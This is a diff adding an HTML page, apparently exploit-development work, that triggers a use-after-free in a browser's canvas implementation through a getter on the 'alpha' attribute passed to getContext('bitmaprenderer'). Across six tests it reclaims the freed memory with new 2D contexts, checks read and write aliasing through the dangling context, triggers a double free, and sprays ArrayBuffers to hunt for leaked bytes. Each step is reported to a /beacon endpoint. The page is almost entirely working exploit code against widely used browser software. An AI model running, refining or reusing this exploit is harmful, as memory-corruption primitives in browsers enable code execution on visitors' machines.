@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V555</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V555-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return {ctx:innerCtx, canvas:outer};
+}
+
+b('BOOT','V555-sametype-reclaim');
+
+// T1: Same-type reclaim — create new Canvas2D after UAF, test if dangling wrapper works
+(function T1(){
+  b('T1-START','same-type-reclaim');
+  var uaf=triggerUAF();
+  var ctxD=uaf.ctx;
+  b('T1-UAF','dangling='+(ctxD?'ok':'null'));
+
+  // Create new canvas + 2d context — should reclaim the freed 768B slot
+  var c2=document.createElement('canvas');
+  c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  b('T1-NEW','newCtx='+(ctxN?'ok':'null'));
+
+  // Test: can we call save() through the dangling wrapper?
+  b('T1-PRESAVE','about to save through dangling');
+  try{
+    ctxD.save();
+    b('T1-SAVE','PASS! save() through dangling works!');
+  }catch(e){b('T1-SAVE-ERR',e.message)}
+  b('T1-DONE','ok');
+})();
+
+// T2: Same-type reclaim — verify alias via lineWidth cross-read
+(function T2(){
+  b('T2-START','cross-read-test');
+  var uaf=triggerUAF();
+  var ctxD=uaf.ctx;
+  var c2=document.createElement('canvas');
+  c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+
+  // Set lineWidth through NEW ctx
+  ctxN.lineWidth=42;
+  b('T2-SET','ctxN.lineWidth=42');
+
+  // Read through DANGLING wrapper
+  b('T2-PRERD','about to read dangling lineWidth');
+  try{
+    var lw=ctxD.lineWidth;
+    b('T2-LW','ctxD.lineWidth='+lw+' (expect 42 if alias)');
+  }catch(e){b('T2-LW-ERR',e.message)}
+  b('T2-DONE','ok');
+})();
+
+// T3: Reverse cross-write — write through dangling, read through new
+(function T3(){
+  b('T3-START','reverse-cross-write');
+  var uaf=triggerUAF();
+  var ctxD=uaf.ctx;
+  var c2=document.createElement('canvas');
+  c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+
+  // Write through DANGLING
+  b('T3-PREWR','about to set lineWidth through dangling');
+  try{
+    ctxD.lineWidth=99;
+    b('T3-SET','ctxD.lineWidth=99');
+  }catch(e){b('T3-SET-ERR',e.message)}
+
+  // Read through NEW
+  try{
+    var lw=ctxN.lineWidth;
+    b('T3-LW','ctxN.lineWidth='+lw+' (expect 99 if alias)');
+  }catch(e){b('T3-LW-ERR',e.message)}
+  b('T3-DONE','ok');
+})();
+
+// T4: Multiple Canvas2D creations — test with 10 new contexts to ensure reclaim
+(function T4(){
+  b('T4-START','multi-reclaim');
+  var uaf=triggerUAF();
+  var ctxD=uaf.ctx;
+
+  var ctxs=[];
+  var canvases=[];
+  for(var i=0;i<10;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    canvases.push(c);
+    ctxs.push(c.getContext('2d'));
+  }
+  b('T4-SPRAY','10 new Canvas2D contexts created');
+
+  // Set unique lineWidth on each
+  for(var i=0;i<10;i++){
+    ctxs[i].lineWidth=(i+1)*11;
+  }
+
+  // Read through dangling — if reclaimed, should match one of the new contexts
+  b('T4-PRERD','about to read dangling lineWidth');
+  try{
+    var lw=ctxD.lineWidth;
+    b('T4-LW','ctxD.lineWidth='+lw);
+    // Which context does it alias?
+    var match=-1;
+    for(var i=0;i<10;i++){
+      if(ctxs[i].lineWidth===lw && lw===(i+1)*11){
+        match=i;break;
+      }
+    }
+    b('T4-MATCH','aliased_ctx='+match);
+  }catch(e){b('T4-LW-ERR',e.message)}
+  b('T4-DONE','ok');
+})();
+
+// T5: Full primitive surface test on same-type reclaim
+(function T5(){
+  b('T5-START','full-surface');
+  var uaf=triggerUAF();
+  var ctxD=uaf.ctx;
+  var c2=document.createElement('canvas');
+  c2.width=100;c2.height=100;
+  var ctxN=c2.getContext('2d');
+
+  var results=[];
+
+  // Test lineWidth R/W
+  try{ctxD.lineWidth=7.5; results.push('lw-w:ok');}catch(e){results.push('lw-w:'+e.message);}
+  try{results.push('lw-r:'+ctxD.lineWidth);}catch(e){results.push('lw-r:'+e.message);}
+
+  // Test globalAlpha R/W
+  try{ctxD.globalAlpha=0.5; results.push('ga-w:ok');}catch(e){results.push('ga-w:'+e.message);}
+  try{results.push('ga-r:'+ctxD.globalAlpha);}catch(e){results.push('ga-r:'+e.message);}
+
+  // Test save/restore
+  try{ctxD.save(); results.push('save:ok');}catch(e){results.push('save:'+e.message);}
+  try{ctxD.restore(); results.push('restore:ok');}catch(e){results.push('restore:'+e.message);}
+
+  // Test beginPath
+  try{ctxD.beginPath(); results.push('beginPath:ok');}catch(e){results.push('beginPath:'+e.message);}
+
+  // Test getContextAttributes
+  try{var a=ctxD.getContextAttributes(); results.push('attrs:'+JSON.stringify(a));}catch(e){results.push('attrs:'+e.message);}
+
+  // Test canvas property (reads m_canvas)
+  try{var cv=ctxD.canvas; results.push('canvas:'+(cv?cv.tagName:'null'));}catch(e){results.push('canvas:'+e.message);}
+
+  // Test fillRect (actual drawing)
+  try{ctxD.fillRect(0,0,10,10); results.push('fillRect:ok');}catch(e){results.push('fillRect:'+e.message);}
+
+  // Test getImageData
+  try{var id=ctxD.getImageData(0,0,1,1); results.push('getImgData:'+id.data.length+'b');}catch(e){results.push('getImgData:'+e.message);}
+
+  // Test setLineDash/getLineDash
+  try{ctxD.setLineDash([5,10,15]); results.push('setLD:ok');}catch(e){results.push('setLD:'+e.message);}
+  try{var ld=ctxD.getLineDash(); results.push('getLD:'+JSON.stringify(ld));}catch(e){results.push('getLD:'+e.message);}
+
+  // Test measureText
+  try{var mt=ctxD.measureText('A'); results.push('mText:w='+mt.width);}catch(e){results.push('mText:'+e.message);}
+
+  b('T5-RESULTS',results.join('|'));
+  b('T5-DONE','ok');
+})();
+
+// T6: Double-UAF — trigger UAF, reclaim with Canvas2D, then trigger SECOND UAF
+// This frees the reclaimed Canvas2D, leaving ctxDangling pointing to freed-again memory
+(function T6(){
+  b('T6-START','double-uaf');
+  var uaf1=triggerUAF();
+  var ctxD=uaf1.ctx;
+
+  // Reclaim with new Canvas2D
+  var c2=document.createElement('canvas');
+  c2.width=1;c2.height=1;
+  var ctxN=c2.getContext('2d');
+  ctxN.lineWidth=42;
+  b('T6-RECLAIM','ctxN created, lw=42');
+
+  // Verify alias
+  try{
+    var lw=ctxD.lineWidth;
+    b('T6-ALIAS','ctxD.lw='+lw+' (expect 42)');
+  }catch(e){b('T6-ALIAS-ERR',e.message)}
+
+  // Trigger SECOND UAF on c2 — this frees the shared Canvas2D
+  var innerCtx2=null;
+  var dict2={};
+  Object.defineProperty(dict2,'alpha',{
+    get:function(){
+      innerCtx2=c2.getContext('2d');
+      return true;
+    }
+  });
+  c2.getContext('bitmaprenderer',dict2);
+  b('T6-UAF2','second UAF triggered');
+
+  // Now ctxD points to freed-again memory
+  // Spray ABs
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T6-ABSPRAY','50 ABs sprayed');
+
+  // Check ABs for lineWidth=42 residue (float64 pattern)
+  var f64view=new Float64Array(1);
+  f64view[0]=42.0;
+  var bytes42=new Uint8Array(f64view.buffer);
+  var pattern42=[];
+  for(var j=0;j<8;j++) pattern42.push(bytes42[j]);
+  b('T6-PATTERN','42.0 as bytes: '+pattern42.map(function(v){return v.toString(16)}).join(''));
+
+  // Search all ABs for the pattern at lineWidth offset (unknown, try common offsets)
+  var found='none';
+  for(var a=0;a<50;a++){
+    var u8=new Uint8Array(abs[a]);
+    var nonzero=0;
+    for(var j=0;j<768;j++){
+      if(u8[j]!==0) nonzero++;
+    }
+    if(nonzero>0){
+      found='AB['+a+']:'+nonzero+'nonzero';
+      // Dump first 64 bytes
+      var hex='';
+      for(var j=0;j<64;j++){
+        var v=u8[j];
+        hex+=(v<16?'0':'')+v.toString(16);
+      }
+      b('T6-HEX'+a,hex);
+      break;
+    }
+  }
+  b('T6-FOUND',found);
+  b('T6-DONE','ok');
+})();
+
+b('DONE','V555-all-complete');
+</script>
+</body></html>
